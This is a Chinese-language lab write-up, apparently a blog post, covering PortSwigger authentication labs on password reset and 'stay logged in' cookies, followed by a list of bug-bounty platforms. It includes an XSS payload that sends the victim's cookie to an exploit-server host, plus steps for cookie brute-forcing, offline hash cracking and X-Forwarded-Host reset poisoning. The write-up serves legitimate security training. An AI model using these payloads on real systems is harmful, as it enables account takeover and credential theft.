<pre><code>应避免通过不安全的通道发送持久口令。在这种情况下，安全性依赖于生成的密码在很短的时间内过期，或者用户立即再次更改其密码。否则，这种方法很容易受到中间人攻击。

电子邮件通常也不被认为是安全的，因为收件箱是永久性的，并且不是真正为机密信息的安全存储而设计的。许多用户还通过不安全的渠道在多个设备之间自动同步收件箱</code></pre>

2、使用URL重置密码
<pre><code>重置密码的一种更可靠的方法是向用户发送唯一的URL，该URL将用户带到密码重置页。此方法的安全性较低的实现使用带有易于猜测的参数的URL来标识正在重置的帐户，例如：
http://vulnerable-website.com/reset-password?user=victim-user

在此示例中，攻击者可以更改user参数以引用他们识别的任何用户名。然后，他们将被直接带到一个页面，在那里他们可以为这个任意用户设置一个新密码。

此过程的一个更好的实现是生成一个高熵、难以猜测的令牌，并基于该令牌创建重置URL。在最佳情况下，此URL不应提供有关正在重置哪个用户密码的提示。 
http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8

当用户访问此URL时，系统应该检查后端是否存在此令牌，如果存在，应该重置哪个用户的密码。此令牌应在短时间后过期，并在重置密码后立即销毁。

但是，某些网站在提交重置表单时也无法再次验证令牌。在这种情况下，攻击者只需通过自己的帐户访问重置表单，删除令牌，然后利用此页面重置任意用户的密码。 

如果重置电子邮件中的URL是动态生成的，也可能容易受到密码重置毒害。在这种情况下，攻击者可能会窃取其他用户的令牌并使用它更改其密码。</code></pre>

3、更改用户密码
<pre><code>通常，更改密码需要输入当前密码，然后输入新密码两次。这些页面基本上依赖于与普通登录页面相同的过程来检查用户名和当前密码是否匹配。因此，这些页可能容易受到相同技术的攻击。

如果密码更改功能允许攻击者在不以受害用户身份登录的情况下直接访问它，则该功能可能特别危险。例如，如果用户名在隐藏字段中提供，攻击者就可能在请求中编辑此值以攻击任意用户。攻击者可能会利用此漏洞枚举用户名和强力密码。 
</code></pre>

<hr/>
涉及实验：
实验3：密码重置逻辑错误
实验11：通过中间件的密码重置中毒
实验12：通过更改密码暴力破解密码


### 2、保持用户登录

---


> 
<h3>实验9：强制使用保持登录状态的Cookie</h3>
信息：
关闭浏览器后，会话未销毁（可以尝试暴力破解）
已有凭据：wiener:peter
攻击账号：carlos
<hr/>
part1:
登陆已有账号（点击stay-logged-in）


<hr/>
part2:
 分析登陆完整过程的数据包
（2个地方有保持登陆的值）
第一个地方，是提交登陆的地方（这个地方肯定是还没登陆进去的）

第二个地方是登陆进去后的页面（这个地方肯定是成功登陆并保存登陆状态的）


stay-logged-in的值解密出来后就是账号-密码（通过账号密码一直保持登陆状态）
先是进行了一遍base64加密

然后对密码进行了cmd5加密

<hr/>
part3:
提示：先退出登陆到首页
（不然后面爆破不出来）


<hr/>
part4:
对被攻击用户登陆状态的stay-logged-in值进行爆破

先导入密码字典

再设置加密规则
（先在是模仿加密规则，和我们退出来的方向相反）
对密码先进行md5加密

 再添加被攻击账号前缀（:千万别打成中文的了）



最后base64加密

<hr/>
part5：
分析结果
进行长度排序

 Y2FybG9zOjZlYmU3NmM5ZmI0MTFiZTk3YjNiMGQ0OGI3OTFhN2M5
解密：carlos:6ebe76c9fb411be97b3b0d48b791a7c9
解密：987654321
————
得出
账号：carlos
密码：987654321





---


---


> 
<h3>实验10：离线密码破解</h3>
xss获取cookie的stay-logged-in值
<hr/>
part1:
已有凭据：wiener:peter
受害者账号：carlos

<hr/>
part2:
在主页找一个博客进行评论
exploit-0af000c604e4c40dc20ec4e80197006f.exploit-server.net/部分填自己的
<pre>`&lt;script&gt;document.location='//exploit-0af000c604e4c40dc20ec4e80197006f.exploit-server.net/'+document.cookie&lt;/script&gt;​`</pre>


<hr/>
part3:
获取xss获取的cookie

 <img alt="" height="895" src="https://img-blog.csdnimg.cn/6b862b650d154516ad4e683ba8357473.png" width="1068"/>

<pre>Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz</pre>
<hr/>
part4：
离线破解
base64破解 
carlos:26323c16d5f4dabff3bb136f2460a943

 cmd5解密：
carlos:onceuponatime

<hr/>
part5：
登陆

 <img alt="" height="759" src="https://img-blog.csdnimg.cn/ca5971222770441ebef4200862f6f9c4.png" width="1200"/>



---


```
exploit-0aea007604ddbf52c85306d901ca0003.exploit-server.net
```

---


> 
<h3>实验11：通过中间件的密码重置中毒</h3>
信息：
已有凭据：wiener:peter
本实验中X-Forwarded-Host标头是受支持的，使用它来将动态生成的重置链接指向自己控制的任意域
<hr/>
part1:

复制邮箱，后面要用（其实后面也可以直接查看）
<pre>`exploit-0aea007604ddbf52c85306d901ca0003.exploit-server.net`</pre>

<hr/>
part2:
退出登陆，到忘记密码流程去



先使用受害者账号名
去获取temp-forgot-password-token


​添加X-Forwarded-Host标头，并指向漏洞服务器（已有的）
X-Forwarded-Host:exploit-0aea007604ddbf52c85306d901ca0003.exploit-server.net


在漏洞服务器中，找到收获账号的temp-forgot-password-token


<pre>nFLC5vX07qjtWVeye3UKdfDOjXaYK0zt</pre>


<hr/>
part3：
再使用自己的已有账号w……
去获取重置密码的URL

再去到服务器邮箱里面


<hr/>
part4：
点击重置密码的URL
并将temp-forgot-password-token值由w……的修改为被害者c……的

 进入重置密码

 重置的需要也需要将temp-forgot-password-token值由w……的修改为被害者c……的


<hr/>
part5：
重置后进行登陆


 <img alt="" height="860" src="https://img-blog.csdnimg.cn/2a47836feddc4175b4da8f16c5189e8c.png" width="1200"/>



---


---


> 
<h3>实验12：通过更改密码暴力破解密码</h3>
信息：
已有凭据：wiener:peter
受害者账号：carlos
<hr/>
part1:
使用已有账号分析（先登陆已有账号）


为了爆破出正确原密码，需借助错误提示（观察响应）
方法1：正确原始密码、不一致的新密码（可爆破出原密码）
爆破中：原密码错误时候提示Current password is incorrect，原密码正确的时候提示New passwords do not match

 ————
方法2：错误原密码、不一致新密码
爆破中：当原密码错误时候，提示Current password is incorrect；当原密码正确到时候，提示信息变为New passwords do not match

 ————
方法3：错误原密码、一致新密码
错误出现302跳转到登陆页面，正确也是302跳转（无法爆破）


<hr/>
part2:
username改为carlos
对原密码进行爆破

导入字典
 <img alt="" height="655" src="https://img-blog.csdnimg.cn/48d0f192d67540f0ac3bd2ff3e333011.png" width="544"/>
 在结果数据包中匹配New passwords do not match（此时说明原密码已经正确了）


<hr/>
part3：
分析结果
账号：carlos
密码：7777777


注册已登陆账号，并登陆carlos




---


---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[看雪渗透测试服务](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

